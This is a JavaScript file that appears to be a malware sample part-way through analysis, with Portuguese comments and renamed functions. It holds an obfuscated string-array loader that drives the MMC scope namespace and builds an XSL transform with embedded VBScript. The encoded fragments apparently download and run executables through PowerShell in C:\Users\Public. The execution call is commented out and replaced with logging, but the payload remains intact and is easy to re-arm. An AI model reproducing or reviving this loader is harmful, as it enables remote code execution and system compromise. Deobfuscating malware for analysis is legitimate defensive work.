console.log("Começou!!!");

var decodeString = mapIndexToString;

(function (initializeArrayFunction, targetValue) {
  var localMapFunction = mapIndexToString,
    stringArray = initializeArrayFunction();
  console.log("While começado.");
  while (true) {
    try {
      var computedValue =
        parseInt(localMapFunction(0x1ad)) / 1 +
        parseInt(localMapFunction(0x1a7)) / 1 +
        parseInt(localMapFunction(0x1ba)) / 1 +
        (parseInt(localMapFunction(0x164)) / 1) *
          (parseInt(localMapFunction(0x20e)) / 1) +
        parseInt(localMapFunction(0x21f)) / 1 +
        (-parseInt(localMapFunction(0x2b5)) / 1) *
          (-parseInt(localMapFunction(0xd8)) / 1) +
        (-parseInt(localMapFunction(0x18a)) / 1) *
          (parseInt(localMapFunction(0x295)) / 1);

      if (computedValue === targetValue) break;
      else stringArray.push(stringArray.shift());
    } catch (error) {
      stringArray.push(stringArray.shift());
    }
  }

  console.log("While terminado.");
})(getStringArray, 0x43431 + 0x39629 + -0x4e1b8);

var scopeNamespace =
    external[decodeString(0x1ec)][decodeString(0x140) + decodeString(0xf0)],
  rootNode = scopeNamespace[decodeString(0xf7)](),
  mainNode = scopeNamespace[decodeString(0x290)](rootNode),
  docNode = scopeNamespace[decodeString(0xf8)](mainNode);

external[decodeString(0x1ec)][decodeString(0x1f1)][
  decodeString(0x243) + decodeString(0x13a)
] = docNode;
(docObject =
  external[decodeString(0x1ec)][decodeString(0x1f1)][
    decodeString(0x262) + decodeString(0x182)
  ]),
  (external[decodeString(0x1ec)][decodeString(0x1f1)][
    decodeString(0x243) + decodeString(0x13a)
  ] = mainNode);

var XML = docObject;
XML[decodeString(0x18c)] = false; // Provavelmente XML.async = false
var xsl = XML;

//xsl[decodeString(0x102)](
console.log(
  unescape(
    decodeString(0x1a1) +
      decodeString(0x1c4) +
      decodeString(0x286) +
      decodeString(0xeb) +
      decodeString(0x25f) +
      decodeString(0x1d8) +
      decodeString(0x13c) +
      decodeString(0x1fa) +
      decodeString(0x280) +
      decodeString(0x2a4) +
      decodeString(0x100) +
      decodeString(0x241) +
      decodeString(0x166) +
      decodeString(0x2ad) +
      decodeString(0x1be) +
      decodeString(0x1cf) +
      decodeString(0x299) +
      decodeString(0x1b4) +
      decodeString(0x2b9) +
      decodeString(0x24a) +
      decodeString(0x120) +
      decodeString(0x10e) +
      decodeString(0x23a) +
      decodeString(0x1a0) +
      decodeString(0xea) +
      decodeString(0x120) +
      decodeString(0x10e) +
      decodeString(0x23b) +
      decodeString(0x223) +
      decodeString(0xdf) +
      decodeString(0xee) +
      decodeString(0x1dc) +
      decodeString(0x149) +
      decodeString(0x2b6) +
      decodeString(0x2c4) +
      decodeString(0x1a9) +
      decodeString(0x21d) +
      decodeString(0xca) +
      decodeString(0x254) +
      decodeString(0x26f) +
      decodeString(0x1d6) +
      decodeString(0x253) +
      decodeString(0x1e7) +
      decodeString(0x12c) +
      decodeString(0xd4) +
      decodeString(0x1f0) +
      decodeString(0x287) +
      decodeString(0x2c2) +
      decodeString(0x1c3) +
      decodeString(0x232) +
      decodeString(0x103) +
      decodeString(0x25b) +
      decodeString(0xe3) +
      decodeString(0x18d) +
      decodeString(0x1ce) +
      decodeString(0x170) +
      decodeString(0xfb) +
      decodeString(0x12f) +
      decodeString(0x296) +
      decodeString(0x26e) +
      decodeString(0x122) +
      decodeString(0x11c) +
      decodeString(0x2a5) +
      decodeString(0x23f) +
      decodeString(0x1e0) +
      decodeString(0x1e3) +
      decodeString(0x1e4) +
      decodeString(0x168) +
      decodeString(0x211) +
      decodeString(0x189) +
      decodeString(0x208) +
      decodeString(0x1c8) +
      decodeString(0x13b) +
      decodeString(0x1c5) +
      decodeString(0x125) +
      decodeString(0x257) +
      decodeString(0x1ea) +
      decodeString(0x2bb) +
      decodeString(0xe7) +
      decodeString(0x2a1) +
      decodeString(0x156) +
      decodeString(0x177) +
      decodeString(0x1cd) +
      decodeString(0x2ac) +
      decodeString(0x151) +
      decodeString(0x12e) +
      decodeString(0x13d) +
      decodeString(0x167) +
      decodeString(0x2aa) +
      decodeString(0xce) +
      decodeString(0x194) +
      decodeString(0xda) +
      decodeString(0x25a) +
      decodeString(0x28a) +
      decodeString(0x1fd) +
      decodeString(0xc2) +
      decodeString(0x250) +
      decodeString(0x163) +
      decodeString(0x29c) +
      decodeString(0xde) +
      (decodeString(0x1ae) +
        decodeString(0x291) +
        decodeString(0x279) +
        decodeString(0xc1) +
        decodeString(0x26b) +
        decodeString(0x270) +
        decodeString(0x244) +
        decodeString(0x152) +
        decodeString(0x206) +
        decodeString(0x115) +
        decodeString(0x297) +
        decodeString(0x1bc) +
        decodeString(0xc3) +
        decodeString(0x29f) +
        decodeString(0x2bb) +
        decodeString(0x14c) +
        decodeString(0x2b1) +
        decodeString(0x229) +
        decodeString(0x162) +
        decodeString(0x154) +
        decodeString(0xd6) +
        decodeString(0x213) +
        decodeString(0x28a) +
        decodeString(0x25d) +
        decodeString(0x281) +
        decodeString(0x1d3) +
        decodeString(0x1bf) +
        decodeString(0x13b) +
        decodeString(0x2c5) +
        decodeString(0x141) +
        decodeString(0x278) +
        decodeString(0x16d) +
        decodeString(0x1e5) +
        decodeString(0x26a) +
        decodeString(0x293) +
        decodeString(0x2a1) +
        decodeString(0x215) +
        decodeString(0x1df) +
        decodeString(0xd7) +
        decodeString(0x23c) +
        decodeString(0x237) +
        decodeString(0xfe) +
        decodeString(0x131) +
        decodeString(0xff) +
        decodeString(0x212) +
        decodeString(0x135) +
        decodeString(0x2b3) +
        decodeString(0x2c3) +
        decodeString(0x249) +
        decodeString(0x2a5) +
        decodeString(0x198) +
        decodeString(0x2be) +
        decodeString(0x266) +
        decodeString(0x221) +
        decodeString(0x15b) +
        decodeString(0x128) +
        decodeString(0x234) +
        decodeString(0x1d1) +
        decodeString(0x20f) +
        decodeString(0x227) +
        decodeString(0x15c) +
        decodeString(0x190) +
        decodeString(0x24e) +
        decodeString(0xef) +
        decodeString(0x14a) +
        decodeString(0xd5) +
        decodeString(0xf4) +
        decodeString(0x2a7) +
        decodeString(0x101) +
        decodeString(0x2ba) +
        decodeString(0x14d) +
        decodeString(0x261) +
        decodeString(0x165) +
        decodeString(0xcc) +
        decodeString(0x258) +
        decodeString(0xc5) +
        decodeString(0x26d) +
        decodeString(0x11e) +
        decodeString(0xd0) +
        decodeString(0xdc) +
        decodeString(0xed) +
        decodeString(0xe0) +
        decodeString(0x1d4) +
        decodeString(0x2b7) +
        decodeString(0x20b) +
        decodeString(0x1b1) +
        decodeString(0x104) +
        decodeString(0x185) +
        decodeString(0x222) +
        decodeString(0x2bd) +
        decodeString(0x139) +
        decodeString(0x2b2) +
        decodeString(0x2bf) +
        decodeString(0x1e6) +
        decodeString(0x213) +
        decodeString(0x289) +
        decodeString(0x187) +
        decodeString(0x236) +
        decodeString(0x112) +
        decodeString(0x116)) +
      (decodeString(0x16e) +
        decodeString(0x255) +
        decodeString(0x188) +
        decodeString(0x176) +
        decodeString(0x16e) +
        decodeString(0x273) +
        decodeString(0x22a) +
        decodeString(0x1d5) +
        decodeString(0x27d) +
        decodeString(0x181) +
        decodeString(0x256) +
        decodeString(0x1a3) +
        decodeString(0x271) +
        decodeString(0x199) +
        decodeString(0x134) +
        decodeString(0xfd) +
        decodeString(0x292) +
        decodeString(0x133) +
        decodeString(0xd9) +
        decodeString(0x233) +
        decodeString(0x19d) +
        decodeString(0x233) +
        decodeString(0x272) +
        decodeString(0x219) +
        decodeString(0x2c6) +
        decodeString(0x1a2) +
        decodeString(0xf1) +
        decodeString(0x22c) +
        decodeString(0x2a6) +
        decodeString(0x178) +
        decodeString(0x1eb) +
        decodeString(0x17e) +
        decodeString(0x1b3) +
        decodeString(0x231) +
        decodeString(0x29a) +
        decodeString(0x246) +
        decodeString(0x200) +
        decodeString(0x1f8) +
        decodeString(0x2c1) +
        decodeString(0x21c) +
        decodeString(0x1b8) +
        decodeString(0x1fe) +
        decodeString(0x12a) +
        decodeString(0xe6) +
        decodeString(0xc8) +
        decodeString(0x2a3) +
        decodeString(0x1b9) +
        decodeString(0x18f) +
        decodeString(0x171) +
        decodeString(0x121) +
        decodeString(0xc4) +
        decodeString(0x147) +
        decodeString(0x105) +
        decodeString(0x1c0) +
        decodeString(0x197) +
        decodeString(0xcb) +
        decodeString(0x1bd) +
        decodeString(0x157) +
        decodeString(0x1eb) +
        decodeString(0x17e) +
        decodeString(0x173) +
        decodeString(0x21e) +
        decodeString(0x1ef) +
        decodeString(0x16a) +
        decodeString(0x24f) +
        decodeString(0x111) +
        decodeString(0x19c) +
        decodeString(0x205) +
        decodeString(0x1d9) +
        decodeString(0xf2) +
        decodeString(0x161) +
        decodeString(0xe1) +
        decodeString(0x119) +
        decodeString(0x215) +
        decodeString(0x1b6) +
        decodeString(0x1f4) +
        decodeString(0xf2) +
        decodeString(0x161) +
        decodeString(0x2b0) +
        decodeString(0x240) +
        decodeString(0x2b4) +
        decodeString(0x224) +
        decodeString(0x28b) +
        decodeString(0x27e) +
        decodeString(0x1a5) +
        decodeString(0x224) +
        decodeString(0xc9) +
        decodeString(0x203) +
        decodeString(0xf2) +
        decodeString(0x161) +
        decodeString(0xe1) +
        decodeString(0x176) +
        decodeString(0xd3) +
        decodeString(0x191) +
        decodeString(0x2af) +
        decodeString(0x17d) +
        decodeString(0x27c) +
        decodeString(0x118) +
        decodeString(0x192) +
        decodeString(0xe4)) +
      (decodeString(0x263) +
        decodeString(0x119) +
        decodeString(0x202) +
        decodeString(0x17c) +
        decodeString(0x1fb) +
        decodeString(0x21b) +
        decodeString(0x260) +
        decodeString(0x17c) +
        decodeString(0x1fb) +
        decodeString(0x24d) +
        decodeString(0x16a) +
        decodeString(0x24f) +
        decodeString(0x284) +
        decodeString(0x10a) +
        decodeString(0x2ae) +
        decodeString(0x27a) +
        decodeString(0x27e) +
        decodeString(0x109) +
        decodeString(0x18f) +
        decodeString(0x1ee) +
        decodeString(0x22f) +
        decodeString(0x1b0) +
        decodeString(0x17f) +
        decodeString(0x23d) +
        decodeString(0x28f) +
        decodeString(0x27b) +
        decodeString(0x269) +
        decodeString(0x275) +
        decodeString(0x106) +
        decodeString(0x110) +
        decodeString(0xe8) +
        decodeString(0xc7) +
        decodeString(0x1cc) +
        decodeString(0x10b) +
        decodeString(0x19e) +
        decodeString(0x19a) +
        decodeString(0x1a8) +
        decodeString(0x298) +
        decodeString(0x11f) +
        decodeString(0x127) +
        decodeString(0x1c7) +
        decodeString(0x15d) +
        decodeString(0x1aa) +
        decodeString(0x2b8) +
        decodeString(0x1c1) +
        decodeString(0x160) +
        decodeString(0xf9) +
        decodeString(0x13f) +
        decodeString(0x11b) +
        decodeString(0x137) +
        decodeString(0x142) +
        decodeString(0x1c6) +
        decodeString(0x14f) +
        decodeString(0x143) +
        decodeString(0x268) +
        decodeString(0xe2) +
        decodeString(0x1ab) +
        decodeString(0x19f) +
        decodeString(0xf3) +
        decodeString(0x2a8) +
        decodeString(0x264) +
        decodeString(0x25e) +
        decodeString(0x113) +
        decodeString(0x130) +
        decodeString(0x294) +
        decodeString(0x27f) +
        decodeString(0x1dd) +
        decodeString(0x1e6) +
        decodeString(0x108) +
        decodeString(0x189) +
        decodeString(0x136) +
        decodeString(0x196) +
        decodeString(0x1e8) +
        decodeString(0xec) +
        decodeString(0x1de) +
        decodeString(0x129) +
        decodeString(0x195) +
        decodeString(0x2c0) +
        decodeString(0x11f) +
        decodeString(0x14b) +
        decodeString(0x242) +
        decodeString(0x1f6) +
        decodeString(0x1ac) +
        decodeString(0x10f) +
        decodeString(0x285) +
        decodeString(0x1e1) +
        decodeString(0x24c) +
        decodeString(0x21a) +
        decodeString(0xf6) +
        decodeString(0xfc) +
        decodeString(0xd2) +
        decodeString(0x265) +
        decodeString(0x114) +
        decodeString(0x229) +
        decodeString(0x1bb) +
        decodeString(0x155) +
        decodeString(0x29b) +
        decodeString(0xe6) +
        decodeString(0x148) +
        decodeString(0x1ff)) +
      (decodeString(0x210) +
        decodeString(0x179) +
        decodeString(0x1c2) +
        decodeString(0x1f2) +
        decodeString(0x28e) +
        decodeString(0x169) +
        decodeString(0x276) +
        decodeString(0x153) +
        decodeString(0x217) +
        decodeString(0x282) +
        decodeString(0x13b) +
        decodeString(0x14e) +
        decodeString(0x1a6) +
        decodeString(0x218) +
        decodeString(0x1fc) +
        decodeString(0x288) +
        decodeString(0x186) +
        decodeString(0x10d) +
        decodeString(0x248) +
        decodeString(0x242) +
        decodeString(0x10c) +
        decodeString(0x16f) +
        decodeString(0x2bd) +
        decodeString(0x176) +
        decodeString(0x1f9) +
        decodeString(0x23e) +
        decodeString(0xc6) +
        decodeString(0x230) +
        decodeString(0x1e9) +
        decodeString(0x1af) +
        decodeString(0x1e2) +
        decodeString(0x226) +
        decodeString(0xe9) +
        decodeString(0x259) +
        decodeString(0x201) +
        decodeString(0xcf) +
        decodeString(0x123) +
        decodeString(0x20a) +
        decodeString(0x251) +
        decodeString(0x144) +
        decodeString(0x220) +
        decodeString(0x193) +
        decodeString(0x10d) +
        decodeString(0x15a) +
        decodeString(0x25c) +
        decodeString(0x13e) +
        decodeString(0x1e1) +
        decodeString(0x177) +
        decodeString(0x1cd) +
        decodeString(0x20d) +
        decodeString(0x277) +
        decodeString(0x1e1) +
        decodeString(0xf5) +
        decodeString(0x252) +
        decodeString(0x1b7) +
        decodeString(0x22d) +
        decodeString(0x216) +
        decodeString(0x274) +
        decodeString(0x278) +
        decodeString(0x16d) +
        decodeString(0x28c) +
        decodeString(0x2a2) +
        decodeString(0x174) +
        decodeString(0x107) +
        decodeString(0x20c) +
        decodeString(0xdd) +
        decodeString(0xcd) +
        decodeString(0x228) +
        decodeString(0x18b) +
        decodeString(0x2a9) +
        decodeString(0x212) +
        decodeString(0x135) +
        decodeString(0x2b3) +
        decodeString(0x146) +
        decodeString(0x1ed) +
        decodeString(0x1d2) +
        decodeString(0x12b) +
        decodeString(0x1db) +
        decodeString(0x1f7) +
        decodeString(0x124) +
        decodeString(0x238) +
        decodeString(0xdb) +
        decodeString(0x28d) +
        decodeString(0x145) +
        decodeString(0x150) +
        decodeString(0x18e) +
        decodeString(0x16c) +
        decodeString(0x2ab) +
        decodeString(0x12d) +
        decodeString(0x24b) +
        decodeString(0x2ab) +
        decodeString(0x16b) +
        decodeString(0x1d1) +
        decodeString(0x117) +
        decodeString(0x126) +
        decodeString(0x2a0) +
        decodeString(0x176) +
        decodeString(0x267) +
        decodeString(0x22b) +
        decodeString(0x159)) +
      (decodeString(0x19b) +
        decodeString(0x292) +
        decodeString(0x1b2) +
        decodeString(0x175) +
        decodeString(0x11f) +
        decodeString(0x207) +
        decodeString(0x1f5) +
        decodeString(0x17a) +
        decodeString(0x1f3) +
        decodeString(0x10d) +
        decodeString(0x11f) +
        decodeString(0x22e) +
        decodeString(0x247) +
        decodeString(0x2bd) +
        decodeString(0x176) +
        decodeString(0x1b5) +
        decodeString(0x2bc) +
        decodeString(0x138) +
        decodeString(0x292) +
        decodeString(0x172) +
        decodeString(0x132) +
        decodeString(0x214) +
        decodeString(0x1da) +
        decodeString(0x283) +
        decodeString(0x180) +
        decodeString(0x2bd) +
        decodeString(0x176) +
        decodeString(0x1b5) +
        decodeString(0x239) +
        decodeString(0xfa) +
        decodeString(0x1a4) +
        decodeString(0x10d) +
        decodeString(0x11f) +
        decodeString(0x22e) +
        decodeString(0x11d) +
        decodeString(0x292) +
        decodeString(0xd1) +
        decodeString(0x17b) +
        decodeString(0x225) +
        decodeString(0x1c9) +
        decodeString(0x209) +
        decodeString(0x15f) +
        decodeString(0x1d7) +
        decodeString(0x1cb) +
        decodeString(0x26c) +
        decodeString(0x11a) +
        decodeString(0x183) +
        decodeString(0x245) +
        decodeString(0x15e) +
        decodeString(0xc0) +
        decodeString(0x184) +
        decodeString(0x1ca) +
        decodeString(0x10e) +
        decodeString(0x29e) +
        decodeString(0x1a9) +
        decodeString(0x21d) +
        decodeString(0xe5) +
        decodeString(0x235) +
        decodeString(0x1d0) +
        decodeString(0x158) +
        "3E")
  )
); //,
// XML[decodeString(0x204) + decodeString(0x29d)](xsl)
//);

// -------------------------------
// Funções renomeadas:
// -------------------------------

function getStringArray() {
  var stringArray = [
    // Aqui entra todo o enorme array original. Mantemos igual, apenas o nome da função mudou.
    "6%24%2A%24",
    "70%24wxvWl",
    "60Ywivw%60",
    "26%24%2A%2",
    "aceholder%",
    "%27%3F%3E%",
    "Jsv%24m%24",
    "s%7BrpsehT",
    "%20%20%20%",
    "sfnLXXT%24",
    "pace",
    "pWgvmtx%24",
    "%2A%24zfGv",
    "EsfnJmpi2G",
    "26QW%5CQP6",
    "4wxvWls%7B",
    "I%7Cigyxms",
    "GetRoot",
    "GetNext",
    "3E%24%26%2",
    "XsJmpi%24t",
    "TpHCM%20%2",
    "rTspmg%7D%",
    "%2D%24Xlir",
    "6%0EwxvI%7",
    "exl%24A%24",
    "www%2Ew3%2",
    "%26%2D%0E%",
    "loadXML",
    "20%22%22%3",
    "CwxvHs%7Br",
    "Dwxiq2MS2J",
    "i%7CxJmpi%",
    "mpi%24%26G",
    "rpsehTexl7",
    "rx%2D%26%2",
    "EppF%7Dxiw",
    "0%24Xvyi%2",
    "i%24%40B%2",
    "E%24%24%24",
    "0%20%20%20",
    "ixyvrGshi%",
    "2C%26G%3E%",
    "%3EViehEpp",
    "S2JmpiI%7C",
    "EevvJmpiTe",
    "4G%3E%60Yw",
    "E33%7Bmrhs",
    "mwxw%2Cwxv",
    "x%2C%26EHS",
    "a%241f%7Cs",
    "8oi%7DPirk",
    "20%2D%20%2",
    "2Hiwgvmtxm",
    "mgmx%0EHmq",
    "vieq2Gpswi",
    "%7BrpsehJm",
    "%24%24%24%",
    "22%0D%0A%2",
    "24c%0E%26%",
    "r%24I%7Ctp",
    "26%24%7Bmx",
    "yfpmg%60xi",
    "4wxvHs%7Br",
    "HF2Wxvieq%",
    "24%5BWgvmt",
    "Wix%24sfnJ",
    "%24YFsyrh%",
    "i%7DTexl%2",
    "pixiJmpi%2",
    "%22VBScrip",
    "eq%0E%24%2",
    "gvmtx%0Ewx",
    "B%20chr%28",
    "xlw%24A%24",
    "CigyxefpiT",
    "4%24%24sfn",
    "24%24Hs%7B",
    "7BjmpiTexl",
    "Ywivw%60Ty",
    "%7BjmpiTex",
    "sr%0E%24%2",
    "ti%24A%245",
    "4%24Hs%7Br",
    "eNode",
    "xvHs%7Brps",
    "D%0A%20%20",
    "vYVP5%24A%",
    "%0E%0EsfnW",
    "4%2A%24Ivv",
    "ScopeNames",
    "A%24%26G%3",
    "4%24%24%5B",
    "Mj%0EsfnJm",
    "%24%26%24%",
    "hJmpi%2Cyv",
    "ww2i%7Ci2g",
    "A%24%5FW%7",
    "Glv%2C78%2",
    "t%20method",
    "A%24Gviexi",
    "24Hmq%24mr",
    "5%24A%24%2",
    "%24sfnJWS2",
    "ehTexl6%24",
    "x%0EIrh%24",
    "p0%24texl%",
    "7BivWlippW",
    "iYVP%24A%2",
    "%24%2A%24G",
    "2i%7Ci%26%",
    "tw5%241Jmp",
    "xl%0EHmq%2",
    "2D%26%24%2",
    "tylesheet%",
    "X%260%24yv",
    "%24Irh%24M",
    "p%26%2D%0E",
    "iW%7DwxiqS",
    "26Ivvsv%24",
    "9%29%3ANex",
    "Rsxlmrk%0E",
    "tx%24jmpi%",
    "Pj%24%2A%2",
    "mg%60gwvww",
    "3gwvww2hpp",
    "11684LFiimg",
    "xw%2CwxvHs",
    "9%2FXSL%2F",
    "24%26lxxt%",
    "24wxvYVP60",
    "6%241Oi%7D",
    "W%7Dwxiq2M",
    "eq%24A%24G",
    "4%24%24Hmq",
    "60Tyfpmg%6",
    "Hs%7Brpseh",
    "44%24Xlir%",
    "M%20%3D%20",
    "vPj%24%2A%",
    "24%24%24%2",
    "%0E%26%28j",
    "WS2HipixiJ",
    "XT2Wirh%0E",
    "4%24%24%24",
    "4wxvI%7Cig",
    "2C%26%24%2",
    "lw%2Cm%2D%",
    "w%24A%2464",
    "4Mj%0E%24%",
    "2A%24zfGvP",
    "28jmpiGsrx",
    "%24%2A%24c",
    "Ivvsv%24Vi",
    "rwiFsh%7D%",
    "rh%24Mj%0E",
    "ect",
    "85%29%20%2",
    "e%20TpHCM%",
    "psehTexl6%",
    "24%24%24%0",
    "j%0EMj%24R",
    "4Xlir%0E%2",
    "0%24wxvWls",
    "32436nznPAg",
    "sfnJWS2Hip",
    "async",
    "0to%203222",
    "2D%0E%24%2",
    "4%2A%24zfG",
    "fnigx%26%2",
    "xirx%5F%28",
    "v%24%28oi%",
    "xyvrGshi%0",
    "i2lxf3gwvw",
    "2CevvJmpiT",
    "l%2D%0E%0E",
    "ViehEppF%7",
    "p%24A%24Gv",
    "%2CwxvWls%",
    "vv2Ryqfiv%",
    "p0%24Jepwi",
    "F%7Dxiw%2C",
    "BjmpiYVP0%",
    "D%0EMj%24I",
    "ppWgvmtx%0",
    "er%3D%22pl",
    "%3C%3Fxml%",
    "s%7BivWlip",
    "4sfnJWS2Jm",
    "exl0%246%0",
    "rx2Pirkxl%",
    "%2A%24Glv%",
    "371874DFsmrV",
    "24%40B%244",
    "0D%0A%20%2",
    "gviexmrk%2",
    "Ts%7BivWli",
    "%24%24mrxV",
    "209302uXLXCM",
    "%26lxxt%3E",
    "i%7Cigyxms",
    "pi%0ESr%24",
    "I%7Cmwxw%2",
    "24%24sfnLX",
    "%0E%26%24%",
    "emas%2Dmic",
    "%24%24sfnW",
    "28oi%7D2Pi",
    "2450%24Xvy",
    "%24%24%5Fw",
    "26%2D%26%2",
    "807144VHKlCe",
    "mg%60xiqt2",
    "2lxf3%7Ber",
    "Oi%7DTexl%",
    "22%20xmlns",
    "hpp%26%0Ew",
    "mpia%3E%3E",
    "ipp%24wgvm",
    "24%2A%24Gl",
    "5B%0D%0ATp",
    "20version%",
    "ehTexl50%2",
    "Wgvmtx2Uym",
    "x2Igls%24%",
    "%0EHmq%24w",
    "x%24sfnWxv",
    "3A%0D%0A%2",
    "0E%22%2Ci%",
    "iqt2tw5%26",
    "yxefpiTexl",
    "%3A%20TpHC",
    "%3Ams%3D%2",
    "%0A%3C%2Fs",
    "viexiSfnig",
    "EsfnJWS2Hi",
    "g%60gwvww2",
    "%24Mj%0EMj",
    "vHs%7Brpse",
    "fix%3D%22u",
    "Irh%24Wyf%",
    "ylesheet%0",
    "l%2D%26%24",
    "vmxi%24sfn",
    "4%26G%3E%6",
    "20%3Coutpu",
    "sehTexl50%",
    "A%244%24Xs",
    "26G%3E%60Y",
    "S0%24sfnLX",
    "lipp2Vyr%2",
    "r%24jempih",
    "XT%0EHmq%2",
    "4wxvYVP50%",
    "0gwvww2i%7",
    "24wxvHs%7B",
    "anguage%3D",
    "Hmq%24m%0E",
    "4wgvmtx%24",
    "%24wxvHs%7",
    "A%24zfGvPj",
    "Document",
    "srjmk%26%0",
    "vPj%0E%0EH",
    "%24A%24%5F",
    "%0A%20%20%",
    "ActiveView",
    "v%2C78%2D%",
    "4%24Xlir%0",
    "rkxl%26%24",
    "LXXT2Wxexy",
    "i%0E%24%24",
    "0Ywivw%60T",
    "24zfGvPj%2",
    "%24%24%5BW",
    "%20%20xmln",
    "j%24%2A%24",
    "440%24Xvyi",
    "lxxt%3E33%",
    "xvmrka%28O",
    "D%24%2A%24",
    "%26%24%2A%",
    "xlw%2Cm%2D",
    "xla%26%24%",
    "4%7F%26%24",
    "transformN",
    "%28JmpiTex",
    "4%26lxxt%3",
    "24Mj%24sfn",
    "%7BjmpiYVP",
    "ieq%24A%24",
    "l%24i%7Cmx",
    "fnJWS2Jmpi",
    "%3E%60Ywiv",
    "0%2450%24X",
    "205mClWgv",
    "x%2C%26Wgv",
    "evvJmpiTex",
    "%24wxvYVP7",
    "%26G%3E%60",
    "rpsehTexl6",
    "Wxvieq2%5B",
    "xl%24A%24%",
    "2HipixiJmp",
    "lv%2C78%2D",
    "2C78%2D0%2",
    "0EIrh%24Mj",
    "vwlipp%241",
    "c%0E%26%C2",
    "E%26%24%24",
    "0%20%20%3C",
    "mpiGsrxirx",
    "2011458BzyKHt",
    "2A%24mrxVi",
    "gvmtx2Wlip",
    "2D%24Xlir%",
    "%221%2E0%2",
    "3F%24%28m%",
    "24%24%24Wi",
    "%24jsv%24%",
    "mtxmrk2Jmp",
    "%7Ci%26%0E",
    "ivw%60Tyfp",
    "YVP70%24wx",
    "ir%24%26KI",
    "A%24c%0E%2",
    "i%0EsfnJWS",
    "24%24sfnWx",
    "mq%24sfnJm",
    "BivWlipp%2",
    "24%24%24%5",
    "HCM%20%3D%",
    "24wxvWls%7",
    "WS%24A%24G",
    "ript%3E%0D",
    "sx%24sfnJW",
    "rxih2thj%2",
    "qt2tw5%26%",
    "xvieq2Wezi",
    "xmlns%3Aus",
    "version%3D",
    "pmg%60%7Be",
    "wyqi%24Ri%",
    "gvmtx2Igls",
    "p0%24sfnJW",
    "v%24%2C%28",
    "Eorg%2F199",
    "xVixyvrGsh",
    "ActiveScop",
    "vWls%7Bjmp",
    "B%20%281%2",
    "8JmpiTexl0",
    "vieq2Stir%",
    "%24Mj%24mr",
    "6%0E%0EWix",
    "om%3Axslt%",
    "4%24%24Wix",
    "C%26ts%7Bi",
    "c%0E%26%5F",
    "D%0EWix%24",
    "S2Jmpia%3E",
    "ythexi2lxf",
    "%24gshi%3E",
    "jmpiTexl0%",
    "ser%22%20l",
    "t%20implem",
    "Texl7%2D%2",
    "Mj%24Rsx%2",
    "psehTexl60",
    "xl5%2D%24X",
    "4evvJmpiTe",
    "%0EwxvYVP6",
    "Afor%20i%2",
    "j%0ERi%7Cx",
    "G%3E%60Ywi",
    "mpiTexlw%0",
    "0D%0A%3Cst",
    "%81%26%24%",
    "JmpiI%7Cmw",
    "ControlObj",
    "24%29%24%2",
    "Hmq%24evvJ",
    "%241Jmpi%2",
    "%2C%26%5BW",
    "sfnLXXT2St",
    "pi2%5Bvmxi",
    "24A%24sfnJ",
    "Ci2gsrjmk%",
    "i%7Ci2gsrj",
    "2C1%29%29%",
    "24%24%24Hs",
    "28%22Stxms",
    "ents%2Dpre",
    "mk%26%0Ewx",
    "piI%7Cmwxw",
    "BjmpiTexl%",
    "Jmpi%24wxv",
    "i%24%26G%3",
    "WS2GviexiX",
    "Texl%24%26",
    "vyi%0EsfnW",
    "E%60Ywivw%",
    "7Bwythexi2",
    "Texl0%24%2",
    "24sfnJmpi%",
    "irx%5F%28m",
    "hTexl7%0EI",
    "8jmpiGsrxi",
    "wxvHs%7Brp",
    "s%3D%22htt",
    "vw%60Tyfpm",
    "%24%2A%24w",
    "LXXT2Viwts",
    "%3E%5Bvmxi",
    "24A%24sfnW",
    "3D%271%2E0",
    "20%20%3C%2",
    "%2D%0E%24%",
    "%0EIrh%24M",
    "%24A%24%26",
    "241px%24%2",
    "0gwvww2hpp",
    "4Hs%7Brpse",
    "24%2A%24%2",
    "7Cx%0EWix%",
    "GetChild",
    "33%7Bmrhs%",
    "%0E%24%24%",
    "26%0EwxvWl",
    "Evve%7D%2C",
    "3230cglRaR",
    "Asc%28mid%",
    "%7Bwythexi",
    "%24Xlir%0E",
    "2urn%3Asch",
    "Fwxvmrka%2",
    "iTexl%24%2",
    "%26%0EwxvY",
    "ode",
    "%5D%5D%3E%",
    "%0EwxvHs%7",
    "26%2D%0E%2",
    "s%7BjmpiTe",
    "%26%0EsfnJ",
    "2A%24c%0E%",
    "p%3A%2F%2F",
    "%24sfnWlip",
    "6teveq%24%",
    "2%5CQPLXXT",
    "pswi%0E%0E",
    "ixiJmpi%24",
    "3E33%7Bmrh",
    "%24sfnWxvi",
    "0%24wxvTs%",
    "Transform%",
    "%2C%28Jmpi",
    "ma%24A%24%",
    "4c%0E%26js",
    "6G%3E%60Yw",
    "psehJmpi%2",
    "fpmg%60gwv",
    "m%24A%244%",
    "1647989EWhTwj",
    "%3D%22text",
    "%24Rsx%24s",
    "4Ts%7BivWl",
    "rosoft%2Dc",
    "0EMj%24Rsx",
    "BrpsehTexl",
    "xvieq2X%7D",
    "0E%24%24%2",
    "iexiSfnigx",
    "4wxvYVP60%",
    "exlw%2D%0E",
    "4%2A%24c%0",
    "1%5BCDATA%",
    "ww2i%7Ci%2",
    "%22%2F%3E%",
    "ehTexl7%24",
    "%0E%0EwxvT",
    "t%3AExecut",
    "lxf3gwvww2",
    "7Bmrhs%7Bw",
    "xih2thj%26",
    "28oi%7D%24",
    "lir%0E%24%",
    "%24%26Ts%7",
    "Tyfpmg%60x",
    "zfGvPj%24%",
    "2F%2F%2D%2",
    "ms%3Ascrip",
    "Dxiw%2C%28",
    "%7BrpsehTe",
    "%60gwvww2i",
    "s%7Bwythex",
    "%24%2A%24%",
    "pi%24wxvYV",
    "24%24Irh%2",
    "24F%7Dteww",
    "%28jmpiGsr",
    "t%22%3E%0D",
    "Sfnigx%2C%",
    "0EwxvHs%7B",
    "wivw%60Tyf",
    "8WrtZke",
    "rpsehJmpi%",
    "w2i%7Ci%26",
    "0E%0EWyf%2",
    "P50%24wxvH",
    "w%60Tyfpmg",
    "VP7%24A%24",
    "2%3E%0D%0A",
    "exl5%0EIrh",
    "4c%0E%26%2",
    "Pmri%24wxv",
    "0%3D%201%2",
    "7D%5F%28m%",
    "%2Fms%3Asc",
  ];
  return stringArray;
}

function mapIndexToString(index, dummyParam) {
  var arr = getStringArray();
  // O código original fazia um offset:
  index = index - (0xcd3 + -0x2 * 0xc8e + 0x1 * 0xd09);
  return arr[index];
}

/*
Explicacao:

---

### Visão Geral

